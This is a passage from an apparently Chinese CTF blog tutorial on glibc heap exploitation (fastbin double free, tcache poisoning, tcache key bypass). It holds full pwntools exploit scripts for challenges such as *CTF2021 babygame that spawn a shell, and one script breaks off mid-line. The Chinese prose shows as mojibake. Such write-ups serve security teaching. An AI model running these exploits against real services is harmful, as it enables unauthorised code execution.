class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc.so&#x27;</span>&#125;)</span><br><span class="line">e = ELF(<span class="string">&#x27;./mulnote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;note&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;new note&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="string">b&#x27;R&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="string">b&#x27;S&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># initialize</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    show()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin double free</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin attack</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2, overlapping chunk with idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x13</span> + p64(libc_base + one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="string">b&#x27;C&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2021/02/24/cW9bfsqA5ky7a2h.png" alt="image.png"></p><h4 id="tcache-double-free"><a href="#tcache-double-free" class="headerlink" title="tcache double free"></a>tcache double free</h4><p>å‰é¢è®²åˆ°ï¼Œç”±äºæ£€æŸ¥ååˆ†ç¨€æ¾çš„ç¼˜æ•…ï¼Œè‡ªlibc2.26èµ·å¼•è¿›çš„tcacheæœºåˆ¶ä¾¿æˆä¸ºäº†ptmallocåˆ©ç”¨çš„å¤§çƒ­é—¨ï¼Œlibc2.29å‰å¯¹äºdouble freeå‡ ä¹è§†è€Œä¸è§çš„æœºåˆ¶ä¹Ÿè®©pwnæ‰‹ä»¬ä¸ç”¨ç»å°½è„‘æ±æ„é€ ä»¥å‰å½¢å¦‚<code>A-&gt;B-&gt;A</code>çš„å¤æ‚åˆ©ç”¨é“¾</p><h5 id="ä¾‹é¢˜ï¼š-CTF2021-babygame-double-free-tcache-poisoning"><a href="#ä¾‹é¢˜ï¼š-CTF2021-babygame-double-free-tcache-poisoning" class="headerlink" title="ä¾‹é¢˜ï¼š*CTF2021 - babygame - double free + tcache poisoning"></a>ä¾‹é¢˜ï¼š*CTF2021 - babygame - double free + tcache poisoning</h5><blockquote><p>è®¾è®¡å¾ˆå·§å¦™çš„ä¸€é“é¢˜ï¼Œä»¥åŠæˆ‘å·®ä¸å¤šæ˜¯ç¡¬è°ƒå‡ºæ¥çš„ï¼ˆ</p></blockquote><p><a href="/download/starCTF2021/pwn/babygame.zip" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-babygame.zip</a></p><p>æƒ¯ä¾‹çš„checksecï¼Œä¿æŠ¤å…¨å¼€</p><p><img src="https://i.loli.net/2021/01/20/y7LnNfmzYWPuc9G.png" alt="image.png"></p><p>è¿è¡Œä¸€ä¸‹ï¼Œå¤§æ¦‚å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ¨ç®±å­å°æ¸¸æˆ</p><p><img src="https://i.loli.net/2021/01/22/7NYPhxkrXisWUqB.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œ<del>ç¬¦å·è¡¨è¢«æ‰£å…‰ï¼Œåˆ†æå‡ºä¸€å¨shit</del></p><blockquote><p>éƒ¨åˆ†å‡½æ•°ã€å˜é‡åç»é‡å‘½å</p></blockquote><p>åœ¨ä¸€å¼€å§‹æ—¶ä¼šåˆ†é…ä¸€ä¸ªå¤§å°ä¸º0x500çš„chunkï¼Œ<strong>è¶…å‡ºäº†tcacheçš„èŒƒå›´</strong>ï¼Œåœ¨<strong>freeæ—¶ä¼šè¢«ç›´æ¥æ”¾å…¥Unsorted Binä¸­</strong></p><p><img src="https://i.loli.net/2021/01/22/6i8zvdhmw31ekBn.png" alt="image.png"></p><p>åœ¨å°è¯•é€€å‡ºæ—¶å¯ä»¥è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæœ€åä¼šfreeæ‰è¿™ä¸ª0x500çš„å¤§chunkï¼Œä½†æ˜¯åé¢æˆ‘ä»¬åˆå¯ä»¥é‡æ–°å°†è¿™ä¸ªchunkç”³è¯·å›æ¥ï¼ˆé€šè¿‡ç¨‹åºçš„restartåŠŸèƒ½ï¼‰ï¼Œ<strong>è¿™ä¸ªæ—¶å€™å°±ä¼šåœ¨chunkä¸Šæ®‹ç•™æŒ‡å‘main_arena + 96çš„æŒ‡é’ˆ</strong></p><p><img src="https://i.loli.net/2021/01/22/gXxwGDlWqTkPVLK.png" alt="image.png"></p><p>åŒæ—¶ï¼Œé¢˜ç›®ä¸­æœ‰ç€æ‰“å°è¯¥chunkçš„åŠŸèƒ½ï¼Œé€šè¿‡freeåé‡æ–°mallocçš„æ–¹å¼<strong>æˆ‘ä»¬ä¾¿å¯ä»¥è·å¾—libcçš„åŸºå€</strong></p><p><img src="https://i.loli.net/2021/01/22/6W2lrHsLmZ7hRvE.png" alt="image.png"></p><p>é¢˜ç›®çš„æ¼æ´ç‚¹åœ¨äºå½“ä½ <strong>æˆåŠŸé€šè¿‡ä¸€å…³åå†é€‰æ‹©ä¸‹ä¸€å…³ä¹‹åé€‰æ‹©é€€å‡ºä¾¿ä¼šå¯¼è‡´double free</strong></p><p><img src="https://i.loli.net/2021/01/22/AR2OPinM8D5Kaeu.png" alt="image.png"></p><p>gdbè°ƒè¯•ï¼Œæˆ‘ä»¬å°†æ–­ç‚¹ä¸‹åœ¨<code>malloc_printerr()</code>å‡½æ•°å¤„ï¼Œå…¶ä¸Šå±‚è°ƒç”¨å‡½æ•°ä¸º<code>_int_free(mstate av, mchunkptr p, int have_lock)</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬<strong>ä¾¿å¯ä»¥ä»rsiå¯„å­˜å™¨å¤„è·å–åˆ°è¢«double freeçš„chunkçš„åœ°å€</strong></p><p><img src="https://i.loli.net/2021/01/23/XtUISQ2ckoZgbsz.png" alt="image.png"></p><p>å…¶sizeä¸º<code>0x61</code></p><p><img src="https://i.loli.net/2021/01/23/D2uwcevXVQsqJih.png" alt="image.png"></p><p><del>ç»å†äº†åœ¨IDAä¸­è‹¦è‹¦å“€åšæ— æ•°å°æ—¶å</del>è¿›è¡ŒåŠ¨æ€è°ƒå¼æ—¶è§‚å¯Ÿåˆ°å¯¹äºç¨‹åºçš„leave your nameåŠŸèƒ½å…¶ä¼šæ ¹æ®è¾“å…¥çš„é•¿åº¦åˆ†é…ç›¸åº”å¤§å°çš„å †å—</p><p><img src="https://i.loli.net/2021/01/23/6RWdGglwUM8ntLO.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/01/23/DdY3TGBJjmfSkVP.png" alt="image.png"></p><p>åŒæ—¶è§‚å¯Ÿåˆ°<strong>è¯¥ç±»å‹å †å—ä¸ä¼šè¢«é‡Šæ”¾ï¼Œè€Œæ˜¯ä¼šæ¯æ¬¡è¾“å…¥éƒ½ç”³è¯·ä¸€æ¬¡</strong></p><p><img src="https://i.loli.net/2021/01/23/Hnj1BqmPCirKRLk.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/01/23/wSIONf7Epij3lCq.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥<strong>åˆ©ç”¨ç¨‹åºçš„leave your nameåŠŸèƒ½ç”³è¯·ä»»æ„æ¬¡æ•°çš„ä»»æ„å¤§å°çš„å †å—</strong></p><p>åŒæ—¶<strong>é¢˜ç›®æ‰€ç»™çš„libcä¸ºå¯ä»¥è¿›è¡Œtcache double freeçš„2.27ç‰ˆæœ¬</strong></p><p><img src="https://i.loli.net/2021/01/22/YpaDTSGX2mLBzvQ.png" alt="image.png"></p><p>åŒæ—¶<strong>åœ¨messageåŠŸèƒ½ä¸­æˆ‘ä»¬æ˜¯å¯ä»¥å¾€0x500çš„å¤§chunkä¸­å†™å…¥å†…å®¹çš„ï¼Œè€Œåœ¨ç¨‹åºé€€å‡ºæ—¶è¯¥chunkä¼šè¢«é‡Šæ”¾</strong></p><p><img src="https://i.loli.net/2021/01/23/Ga3ehQvfPrDdLpJ.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿è€ƒè™‘<strong>å…ˆæ³„éœ²libcåœ°å€åé€šè¿‡double freeæ„é€ tcache poisoningè¿›è¡Œä»»æ„åœ°å€å†™æ”¹å†™__free_hookä¸ºsystemå‡½æ•°åé€šè¿‡messageåŠŸèƒ½åˆ›å»ºå†…å®¹ä¸ºâ€&#x2F;bin&#x2F;shâ€çš„å †å—åé€€å‡ºä½¿å¾—è¯¥å †å—è¢«é‡Šæ”¾å³å¯get shell</strong></p><p>æœ€åæ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc.so.6&#x27;</span>&#125;) <span class="comment"># p = remote(&#x27;52.152.231.198&#x27;, 8082)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_free</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;w&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;w&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your name:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;l&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;message:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    leak()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    double_free()</span><br><span class="line">    new(<span class="string">b&#x27;&#x27;</span>.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>)) <span class="comment"># a redundante chunk tested out</span></span><br><span class="line">    new(p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    new(<span class="string">b&#x27;&#x27;</span>.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    new(p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;m&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2021/01/22/hOBAxz4YWRQoaf2.png" alt="image.png"></p><h4 id="tcache-key-bypassï¼ˆlibc-2-29-and-upï¼‰"><a href="#tcache-key-bypassï¼ˆlibc-2-29-and-upï¼‰" class="headerlink" title="tcache key bypassï¼ˆlibc 2.29 and upï¼‰"></a>tcache key bypassï¼ˆlibc 2.29 and upï¼‰</h4><p>å‰é¢è®²åˆ°ï¼Œè‡ªglibc2.29ç‰ˆæœ¬èµ·tcacheæ–°å¢äº†ä¸€ä¸ªkeyå­—æ®µï¼Œè¯¥å­—æ®µä½äºchunkçš„bkå­—æ®µï¼Œå€¼ä¸ºtcacheç»“æ„ä½“çš„åœ°å€ï¼Œè‹¥free()æ£€æµ‹åˆ°chunk-&gt;bk &#x3D;&#x3D; tcacheåˆ™ä¼šéå†tcacheå¯¹åº”é“¾è¡¨ä¸­æ˜¯å¦æœ‰è¯¥chunk</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œtcache double freeä¹‹å‰ï¼Œ<strong>è¿˜éœ€è¦æ¸…é™¤tcache key</strong>ï¼Œè€Œä¸èƒ½åƒfastbiné‚£æ ·é æ„é€ A-&gt;B-&gt;Açš„freeé“¾ç»•è¿‡ï¼Œä½†å¥½å¤„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡tcache keyç›´æ¥æ³„éœ²å †åŸºå€</strong></p><p>CTFä¸­æ¶‰åŠtcache keyçš„é¢˜ç›®ä¸­é€šå¸¸éƒ½ä¼šæä¾›æœ‰æ¸…é™¤è¯¥keyçš„æ–¹æ³•ï¼Œè‹¥æ²¡æœ‰ä¹Ÿå¯ä»¥åœ¨å¡«æ»¡tcacheåé‡æ–°å›å½’fastbinçš„åˆ©ç”¨</p><h5 id="ä¾‹é¢˜1ï¼ˆæ¸…é™¤tcache-keyï¼‰ï¼šbytectf2020-final-awd-day1-diary"><a href="#ä¾‹é¢˜1ï¼ˆæ¸…é™¤tcache-keyï¼‰ï¼šbytectf2020-final-awd-day1-diary" class="headerlink" title="ä¾‹é¢˜1ï¼ˆæ¸…é™¤tcache keyï¼‰ï¼šbytectf2020 - final - awd day1 - diary"></a>ä¾‹é¢˜1ï¼ˆæ¸…é™¤tcache keyï¼‰ï¼šbytectf2020 - final - awd day1 - diary</h5><p><a href="/download/bytectf2020/final/awd/day1/diary/diary" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-diary</a></p><p>å¤§æ¦‚æ˜¯ä»¥ä¸‹å‡ ä¸ªç‚¹ï¼š</p><ul><li>deleteå †å—çš„æ—¶å€™æ²¡æœ‰ç½®é›¶å­˜åœ¨UAFï¼Œé‡æ–°editå¯ä»¥æ¸…é™¤tcache keyç»•è¿‡æ£€æµ‹</li><li>editæ—¶ä¼šè¾“å‡ºå †å—å¤§å°ï¼Œä¹Ÿå°±æ˜¯è¾“å‡ºFDï¼ŒFDæŒ‡é’ˆç”¨æ¥å­˜å‚¨å †å—å¤§å°ï¼Œå¯ä»¥æ³„éœ²å †åœ°å€å’Œæ ˆåŸºå€</li><li>ç”±äºçŠ¯äº†ä»¥chunkçš„FDæŒ‡é’ˆæ¥åˆ¤æ–­å †å—å¤§å°çš„é€»è¾‘é”™è¯¯åˆ¤æ–­ï¼Œäºæ˜¯deleteåå†editå¯ä»¥è¿›è¡Œå †å—æº¢å‡º</li><li>ä¿®æ”¹__free_hookä¸ºsystemä»¥åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸ºâ€&#x2F;bin&#x2F;shâ€çš„å—å³å¯get shell</li></ul><p>æ¯”èµ›ä¸­è¸©å‘çš„ç‚¹ï¼š</p><ul><li>ç”±äºFDç”¨äºå‚¨å­˜å †å—å¤§å°ï¼Œåˆ©ç”¨editæ³„éœ²main_arenaçš„æ—¶å€™ä¼šç ´åBKï¼Œéœ€è¦æ‰‹åŠ¨å°†main_arena + 96è¾“å›å»</li><li>åŒä¸Šï¼Œç”±äºè¾“å…¥éƒ½æ˜¯ä»BKå¼€å§‹ï¼Œæ•…éœ€è¦å †æº¢å‡ºæ”¹ä¸€ä¸ªchunkçš„FDä¸ºâ€&#x2F;bin&#x2F;shâ€</li></ul><p>æ¯”èµ›æ—¶å†™çš„expå¦‚ä¸‹ï¼šï¼ˆç¨å¾®æœ‰ä¸€ä¸¶ä¹±â€¦ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./diary&#x27;</span>)<span class="comment">#remote(&#x27;&#x27;, 5021)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./diary&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>) <span class="comment"># test locally</span></span><br><span class="line">one_gadget = <span class="number">0xe6e73</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Options&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">name, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span 